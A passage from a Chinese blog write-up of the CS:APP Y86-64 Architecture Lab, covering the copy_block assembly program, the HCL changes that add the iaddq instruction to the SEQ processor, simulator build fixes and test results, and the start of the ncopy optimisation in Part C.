<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220312143805214.png" alt="image-20220312143805214"></p>
<p><strong>结果正确！</strong></p>
<h2 id="copy-block"><a href="#copy-block" class="headerlink" title="copy_block"></a>copy_block</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* copy_block - Copy src to dest and return xor checksum of src */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">copy_block</span><span class="params">(<span class="type">long</span> *src, <span class="type">long</span> *dest, <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">long</span> val = *src++;</span><br><span class="line">        *dest++ = val;</span><br><span class="line">        result ^= val;</span><br><span class="line">        len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>数组赋值操作，返回值为原数组各项的按位异或</p>
<p>这段代码的架构与书上<strong>图 4-7</strong>的例子完全相同，包括常数的处理，循环的设置技巧，退出循环的判断… 照猫画虎即可，当然，我也在后面附上了注释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">/* copy_block - Copy src to dest and return xor checksum of src */</span><br><span class="line"># author: Deconx</span><br><span class="line"></span><br><span class="line"># Execution begins at address 0</span><br><span class="line">        .pos 0</span><br><span class="line">        irmovq stack, %rsp      # Set up stack pointer</span><br><span class="line">        call main               # Execute main program</span><br><span class="line">        halt                    # Terminate program</span><br><span class="line"></span><br><span class="line"># Sample</span><br><span class="line">        .align 8</span><br><span class="line"># Source block</span><br><span class="line">src:</span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad 0xc00</span><br><span class="line"></span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">        .quad 0x111</span><br><span class="line">        .quad 0x222</span><br><span class="line">        .quad 0x333</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">        irmovq src, %rdi        # src</span><br><span class="line">        irmovq dest, %rsi       # dest</span><br><span class="line">        irmovq $3, %rdx         # len</span><br><span class="line">        call copy_block</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line"># long copy_block(long *src, long *dest, long len)</span><br><span class="line"># src in %rdi</span><br><span class="line"># dest in %rsi</span><br><span class="line"># len in %rdx</span><br><span class="line">copy_block:</span><br><span class="line">        irmovq $8, %r8</span><br><span class="line">        irmovq $1, %r9</span><br><span class="line">        irmovq $0, %rax</span><br><span class="line">        andq %rdx, %rdx</span><br><span class="line">        jmp test</span><br><span class="line">loop:</span><br><span class="line">        mrmovq (%rdi), %r10     # val = *src1</span><br><span class="line">        addq %r8, %rdi          # src++</span><br><span class="line">        rmmovq %r10, (%rsi)     # *dest = val</span><br><span class="line">        addq %r8, %rsi          # dest++</span><br><span class="line">        xorq %r10, %rax         # result ^= val</span><br><span class="line">        subq %r9, %rdx          # len--.  Set CC</span><br><span class="line">test:</span><br><span class="line">        jne loop                # Stop when 0</span><br><span class="line">        ret</span><br><span class="line">        </span><br><span class="line"># Stack starts here and grows to lower addresses</span><br><span class="line">        .pos 0x200</span><br><span class="line">stack: </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译运行一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220312155107577.png" alt="image-20220312155107577"></p>
<p><strong>结果完全正确</strong></p>
<h1 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h1><p>Part B 整合了第 4 章的 homework - 4.51, 4.52。就是实现<code>iaddq</code>指令，将立即数与寄存器相加。可以参考<code>irmovq</code>和<code>OPq</code>指令的计算。在开始之前，我们还是先回顾一下处理一条指令的各个阶段吧！</p>
<h2 id="回顾：指令处理框架"><a href="#回顾：指令处理框架" class="headerlink" title="回顾：指令处理框架"></a>回顾：指令处理框架</h2><ul>
<li><strong>取址：</strong>根据 PC 的值从内存中读取指令字节<ul>
<li>指令指示符字节的两个四位部分，为<code>icode:ifun</code></li>
<li>寄存器指示符字节，为 <code>rA</code>, <code>rB</code></li>
<li>8字节常数字，为 <code>valC</code></li>
<li>计算下一条指令地址，为 <code>valP</code></li>
</ul>
</li>
<li><strong>译码：</strong>从寄存器读入最多两个操作数<ul>
<li>由 <code>rA</code>, <code>rB</code> 指明的寄存器，读为 <code>valA</code>, <code>valB</code></li>
<li>对于指令<code>popq</code>, <code>pushq</code>, <code>call</code>, <code>ret</code>也可能从<code>%rsp</code>中读</li>
</ul>
</li>
<li><strong>执行：</strong>根据<code>ifun</code>计算，或计算内存引用的有效地址，或增加或减少栈指针<ul>
<li>对上述三者之一进行的操作得到的值为<code>valE</code></li>
<li>如果是计算，则设置条件码</li>
<li>对于条件传送指令，检验条件码和传送条件，并据此更新目标寄存器</li>
<li>对于跳转指令，决定是否选择分支</li>
</ul>
</li>
<li><strong>访存：</strong>顾名思义<ul>
<li>可能是将数据写入内存</li>
<li>若是从内存中读出数据，则读出的值为<code>valM</code></li>
</ul>
</li>
<li><strong>写回：</strong>最多写两个结果到寄存器</li>
<li><strong>更新 PC：</strong>将 PC 设置成下一条指令的地址</li>
</ul>
<h2 id="iaddq指令执行过程"><a href="#iaddq指令执行过程" class="headerlink" title="iaddq指令执行过程"></a><code>iaddq</code>指令执行过程</h2><p><code>iaddq</code>的执行与<code>Opq</code>非常相似，后者需要取出<code>rA</code>与<code>rB</code>分别指示的寄存器进行运算后再写回<code>rB</code>指示的寄存器。而前者与后者唯一的区别就是，不需要从<code>rA</code>中取数，直接立即数计算即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">指令为：iaddq V, rB</span><br><span class="line">取指：</span><br><span class="line">	icode:ifun &lt;- M_1[PC]</span><br><span class="line">	rA:rB &lt;- M_1[PC+<span class="number">1</span>]</span><br><span class="line">	valC &lt;- M_8[PC+<span class="number">2</span>]</span><br><span class="line">	valP &lt;- PC+<span class="number">10</span></span><br><span class="line"></span><br><span class="line">译码：</span><br><span class="line">	valB &lt;- R[rB]</span><br><span class="line"></span><br><span class="line">执行：</span><br><span class="line">	valE &lt;-  valB + valC</span><br><span class="line">	Set CC</span><br><span class="line"></span><br><span class="line">访存：</span><br><span class="line">	</span><br><span class="line">写回：</span><br><span class="line">	R[rB] &lt;- valE</span><br><span class="line"></span><br><span class="line">更新PC：</span><br><span class="line">	PC &lt;- valP</span><br></pre></td></tr></table></figure>

<h2 id="修改HCL代码"><a href="#修改HCL代码" class="headerlink" title="修改HCL代码"></a>修改<code>HCL</code>代码</h2><p>接下来要在<code>seq-full.hcl</code>文件中修改代码。由于<code>iaddq</code>的操作与<code>OPq</code>和<code>irmovq</code>类似，比较取巧的做法是，搜索有这两个指令的描述块进行修改即可。本着学习的目的，我们分阶段对所有信号逐个分析</p>
<p><strong>取指阶段</strong></p>
<p><code>instr_valid</code>：判断指令是否合法，当然应该加上。修改后为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> instr_valid = icode in </span><br><span class="line">	&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>

<p><code>need_regids</code>：判断指令是否包括寄存器指示符字节，当然也应该加上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> need_regids =</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>

<p><code>need_valC</code>：判断指令是否包括常数字，还是要加上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> need_valC =</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>

<p><strong>译码和写回阶段</strong></p>
<p><code>srcB</code>：赋为产生<code>valB</code>的寄存器。译码阶段要从<code>rA</code>, <code>rB</code> 指明的寄存器读为 <code>valA</code>, <code>valB</code>，而<code>iaddq</code>有一个<code>rB</code>，于是有以下修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">word srcB = [</span><br><span class="line">	icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	<span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t need <span class="keyword">register</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p><code>dst_E</code>：表明写端口 E 的目的寄存器，计算出来的值<code>valE</code>将放在那里。最终结果要存放在<code>rB</code>中，所以要修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">word dstE = [</span><br><span class="line">	icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;</span><br><span class="line">	icode in &#123; IIRMOVQ, IOPQ, IIADDQ &#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	<span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t write any <span class="keyword">register</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p><strong>执行阶段</strong></p>
<p>执行阶段<code>ALU</code>要对<code>aluA</code>和<code>aluB</code>进行计算，计算格式为：<code>aluB OP aluA</code>。所以<code>aluaA</code>可以是<code>valA</code>和<code>valC</code>或者<code>+-8</code>，<code>aluaB</code>只能是<code>valB</code>。而<code>iaddq</code>执行阶段进行的运算是<code>valB + valC</code>，于是可知修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">## Select input A to ALU</span><br><span class="line">word aluA = [</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ &#125; : valA;</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC;</span><br><span class="line">	icode in &#123; ICALL, IPUSHQ &#125; : <span class="number">-8</span>;</span><br><span class="line">	icode in &#123; IRET, IPOPQ &#125; : <span class="number">8</span>;</span><br><span class="line">	# Other instructions don<span class="number">&#x27;</span>t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU</span><br><span class="line">word aluB = [</span><br><span class="line">	icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">		      IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : valB;</span><br><span class="line">	icode in &#123; IRRMOVQ, IIRMOVQ &#125; : <span class="number">0</span>;</span><br><span class="line">	# Other instructions don<span class="number">&#x27;</span>t need ALU</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p><code>set_cc</code>：判断是否应该更新条件码寄存器，这里应该加上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> set_cc = icode in &#123; IOPQ, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>

<p><strong>访存阶段</strong></p>
<p><code>iaddq</code>没有访存阶段，无需修改</p>
<p><strong>更新PC阶段</strong></p>
<p><code>iaddq</code>不涉及转移等操作，也无需修改</p>
<h2 id="测试SEQ"><a href="#测试SEQ" class="headerlink" title="测试SEQ"></a>测试<code>SEQ</code></h2><h3 id="编译失败处理办法"><a href="#编译失败处理办法" class="headerlink" title="编译失败处理办法"></a>编译失败处理办法</h3><p>编译<code>ssim</code>的时候出现了很多问题：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220312222140881.png" alt="image-20220312222140881"></p>
<p>提示不存在<code>tk.h</code>这个头文件，这是由于实验文件太老。把<code>Makefile</code>修改一下。第 20 行改为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TKINC=-isystem /usr/include/tcl8.6</span><br></pre></td></tr></table></figure>

<p>第 26 行改为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CFLAGS=-Wall -O2 -DUSE_INTERP_RESULT</span><br></pre></td></tr></table></figure>

<p>但是接下来还是报错了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: /tmp/ccKTMI04.o:(.data.rel+0x0): undefined reference to `matherr<span class="string">&#x27;</span></span><br><span class="line"><span class="string">collect2: error: ld returned 1 exit status</span></span><br><span class="line"><span class="string">make: *** [Makefile:44: ssim] Error 1</span></span><br></pre></td></tr></table></figure>

<p>这是因为较新版本<code>glibc</code>弃用了这部分内容</p>
<p>解决办法是注释掉<code> /sim/pipe/psim.c 806、807 line</code>和<code> /sim/seq/ssim.c 844、845 line</code>。即：有源代码中有<code>matherr</code>的一行和它的下一行</p>
<p>接下来就能编译成功了！虽然会有很多 Warning</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><strong>第一轮测试</strong></p>
<p>运行一个简单的<code>Y86-64</code> 程序，并将结果<code>ISA</code>模拟器的结果进行比对，输出如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&gt; ./ssim -t ../y86-code/asumi.yo</span><br><span class="line">Y86-64 Processor: seq-full.hcl</span><br><span class="line">137 bytes of code <span class="built_in">read</span></span><br><span class="line">IF: Fetched irmovq at 0x0.  ra=----, rb=%rsp, valC = 0x100</span><br><span class="line">IF: Fetched call at 0xa.  ra=----, rb=----, valC = 0x38</span><br><span class="line">Wrote 0x13 to address 0xf8</span><br><span class="line">IF: Fetched irmovq at 0x38.  ra=----, rb=%rdi, valC = 0x18</span><br><span class="line">IF: Fetched irmovq at 0x42.  ra=----, rb=%rsi, valC = 0x4</span><br><span class="line">IF: Fetched call at 0x4c.  ra=----, rb=----, valC = 0x56</span><br><span class="line">Wrote 0x55 to address 0xf0</span><br><span class="line">IF: Fetched xorq at 0x56.  ra=%rax, rb=%rax, valC = 0x0</span><br><span class="line">IF: Fetched andq at 0x58.  ra=%rsi, rb=%rsi, valC = 0x0</span><br><span class="line">IF: Fetched jmp at 0x5a.  ra=----, rb=----, valC = 0x83</span><br><span class="line">IF: Fetched jne at 0x83.  ra=----, rb=----, valC = 0x63</span><br><span class="line">IF: Fetched mrmovq at 0x63.  ra=%r10, rb=%rdi, valC = 0x0</span><br><span class="line">IF: Fetched addq at 0x6d.  ra=%r10, rb=%rax, valC = 0x0</span><br><span class="line">IF: Fetched iaddq at 0x6f.  ra=----, rb=%rdi, valC = 0x8</span><br><span class="line">IF: Fetched iaddq at 0x79.  ra=----, rb=%rsi, valC = 0xffffffffffffffff</span><br><span class="line">IF: Fetched jne at 0x83.  ra=----, rb=----, valC = 0x63</span><br><span class="line">IF: Fetched mrmovq at 0x63.  ra=%r10, rb=%rdi, valC = 0x0</span><br><span class="line">IF: Fetched addq at 0x6d.  ra=%r10, rb=%rax, valC = 0x0</span><br><span class="line">IF: Fetched iaddq at 0x6f.  ra=----, rb=%rdi, valC = 0x8</span><br><span class="line">IF: Fetched iaddq at 0x79.  ra=----, rb=%rsi, valC = 0xffffffffffffffff</span><br><span class="line">IF: Fetched jne at 0x83.  ra=----, rb=----, valC = 0x63</span><br><span class="line">IF: Fetched mrmovq at 0x63.  ra=%r10, rb=%rdi, valC = 0x0</span><br><span class="line">IF: Fetched addq at 0x6d.  ra=%r10, rb=%rax, valC = 0x0</span><br><span class="line">IF: Fetched iaddq at 0x6f.  ra=----, rb=%rdi, valC = 0x8</span><br><span class="line">IF: Fetched iaddq at 0x79.  ra=----, rb=%rsi, valC = 0xffffffffffffffff</span><br><span class="line">IF: Fetched jne at 0x83.  ra=----, rb=----, valC = 0x63</span><br><span class="line">IF: Fetched mrmovq at 0x63.  ra=%r10, rb=%rdi, valC = 0x0</span><br><span class="line">IF: Fetched addq at 0x6d.  ra=%r10, rb=%rax, valC = 0x0</span><br><span class="line">IF: Fetched iaddq at 0x6f.  ra=----, rb=%rdi, valC = 0x8</span><br><span class="line">IF: Fetched iaddq at 0x79.  ra=----, rb=%rsi, valC = 0xffffffffffffffff</span><br><span class="line">IF: Fetched jne at 0x83.  ra=----, rb=----, valC = 0x63</span><br><span class="line">IF: Fetched ret at 0x8c.  ra=----, rb=----, valC = 0x0</span><br><span class="line">IF: Fetched ret at 0x55.  ra=----, rb=----, valC = 0x0</span><br><span class="line">IF: Fetched halt at 0x13.  ra=----, rb=----, valC = 0x0</span><br><span class="line">32 instructions executed</span><br><span class="line">Status = HLT</span><br><span class="line">Condition Codes: Z=1 S=0 O=0</span><br><span class="line">Changed Register State:</span><br><span class="line">%rax:   0x0000000000000000      0x0000abcdabcdabcd</span><br><span class="line">%rsp:   0x0000000000000000      0x0000000000000100</span><br><span class="line">%rdi:   0x0000000000000000      0x0000000000000038</span><br><span class="line">%r10:   0x0000000000000000      0x0000a000a000a000</span><br><span class="line">Changed Memory State:</span><br><span class="line">0x00f0: 0x0000000000000000      0x0000000000000055</span><br><span class="line">0x00f8: 0x0000000000000000      0x0000000000000013</span><br><span class="line">ISA Check Succeeds</span><br></pre></td></tr></table></figure>

<p>成功！</p>
<p><strong>标准测试</strong></p>
<p>运行一个标准检查程序</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">cd</span> ../y86-code; make testssim</span><br><span class="line">../seq/ssim -t asum.yo &gt; asum.seq</span><br><span class="line">../seq/ssim -t asumr.yo &gt; asumr.seq</span><br><span class="line">../seq/ssim -t cjr.yo &gt; cjr.seq</span><br><span class="line">../seq/ssim -t j-cc.yo &gt; j-cc.seq</span><br><span class="line">../seq/ssim -t poptest.yo &gt; poptest.seq</span><br><span class="line">../seq/ssim -t pushquestion.yo &gt; pushquestion.seq</span><br><span class="line">../seq/ssim -t pushtest.yo &gt; pushtest.seq</span><br><span class="line">../seq/ssim -t prog1.yo &gt; prog1.seq</span><br><span class="line">../seq/ssim -t prog2.yo &gt; prog2.seq</span><br><span class="line">../seq/ssim -t prog3.yo &gt; prog3.seq</span><br><span class="line">../seq/ssim -t prog4.yo &gt; prog4.seq</span><br><span class="line">../seq/ssim -t prog5.yo &gt; prog5.seq</span><br><span class="line">../seq/ssim -t prog6.yo &gt; prog6.seq</span><br><span class="line">../seq/ssim -t prog7.yo &gt; prog7.seq</span><br><span class="line">../seq/ssim -t prog8.yo &gt; prog8.seq</span><br><span class="line">../seq/ssim -t ret-hazard.yo &gt; ret-hazard.seq</span><br><span class="line">grep <span class="string">&quot;ISA Check&quot;</span> *.<span class="built_in">seq</span></span><br><span class="line">asum.seq:ISA Check Succeeds</span><br><span class="line">asumr.seq:ISA Check Succeeds</span><br><span class="line">cjr.seq:ISA Check Succeeds</span><br><span class="line">j-cc.seq:ISA Check Succeeds</span><br><span class="line">poptest.seq:ISA Check Succeeds</span><br><span class="line">prog1.seq:ISA Check Succeeds</span><br><span class="line">prog2.seq:ISA Check Succeeds</span><br><span class="line">prog3.seq:ISA Check Succeeds</span><br><span class="line">prog4.seq:ISA Check Succeeds</span><br><span class="line">prog5.seq:ISA Check Succeeds</span><br><span class="line">prog6.seq:ISA Check Succeeds</span><br><span class="line">prog7.seq:ISA Check Succeeds</span><br><span class="line">prog8.seq:ISA Check Succeeds</span><br><span class="line">pushquestion.seq:ISA Check Succeeds</span><br><span class="line">pushtest.seq:ISA Check Succeeds</span><br><span class="line">ret-hazard.seq:ISA Check Succeeds</span><br><span class="line"><span class="built_in">rm</span> asum.seq asumr.seq cjr.seq j-cc.seq poptest.seq pushquestion.seq pushtest.seq prog1.seq prog2.seq prog3.seq prog4.seq prog5.seq prog6.seq prog7.seq prog8.seq ret-hazard.seq</span><br></pre></td></tr></table></figure>

<p>全部都是 Succeeds</p>
<p><strong>回归测试</strong></p>
<p>测试除<code>iaddq</code>的所有指令</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220312224855040.png" alt="image-20220312224855040"></p>
<p>专门测试<code>iaddq</code>指令</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220312225008116.png" alt="image-20220312225008116"></p>
<p>于是，我们就通过了实验材料中的所有测试用例！</p>
<h1 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h1><p>Part C 在<code>sim/pipe</code>中进行。PIPE 是使用了转发技术的流水线化的<code>Y86-64</code>处理器。它相比 Part B 增加了流水线寄存器和流水线控制逻辑。</p>
<p>在本部分中，我们要通过修改<code>pipe-full.hcl</code>和<code>ncopy.ys</code>来优化程序，通过程序的效率，也就是 CPE 来计算我们的分数，分数由下述公式算出<br>$$<br>S&#x3D;\begin{cases}<br>    0,                      c&gt;10.5\<br>    20\cdot \left( 10.5-c \right) ,     7.50\leqslant c\leqslant 10.50\<br>    60,                     c&lt;7.50\<br>\end{cases}<br>$$<br>首先，<code>iaddq</code>是一个非常好的指令，它可以把两步简化为一步，所以我们先修改<code>pipe-full.hcl</code>，增加<code>iaddq</code>指令，修改参考 Part B 即可。稳妥起见，修改后还是应该测试一下这个模拟器，<code>Makefile</code>参考 Part B 部分进行同样的修改后编译。然后执行以下命令进行测试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./psim -t ../y86-code/asumi.yo</span><br><span class="line"><span class="built_in">cd</span> ../ptest; make SIM=../pipe/psim</span><br><span class="line"><span class="built_in">cd</span> ../ptest; make SIM=../pipe/psim TFLAGS=-i</span><br></pre></td></tr></table></figure>

<p>当所有测试都显示 Succeed 后，就可以真正开始本部分的重头戏了！</p>
<p><code>ncopy</code>函数将一个长度为<code>len</code>的整型数组<code>src</code>复制到一个不重叠的数组<code>dst</code>，并返回<code>src</code>中正数的个数。C 语言代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ncopy - copy src to dst, returning number of positive ints</span></span><br><span class="line"><span class="comment"> * contained in src array.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">word_t</span> <span class="title function_">ncopy</span><span class="params">(<span class="type">word_t</span> *src, <span class="type">word_t</span> *dst, <span class="type">word_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">word_t</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">word_t</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	val = *src++;</span><br><span class="line">	*dst++ = val;</span><br><span class="line">	<span class="keyword">if</span> (val &gt; <span class="number">0</span>)</span><br><span class="line">	    count++;</span><br><span class="line">	len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax		# count = 0;</span><br><span class="line">	andq %rdx,%rdx		# len &lt;= 0?</span><br><span class="line">	jle Done		# if so, goto Done:</span><br><span class="line"></span><br><span class="line">Loop:	mrmovq (%rdi), %r10	# read val from src...</span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	andq %r10, %r10		# val &lt;= 0?</span><br><span class="line">	jle Npos		# if so, goto 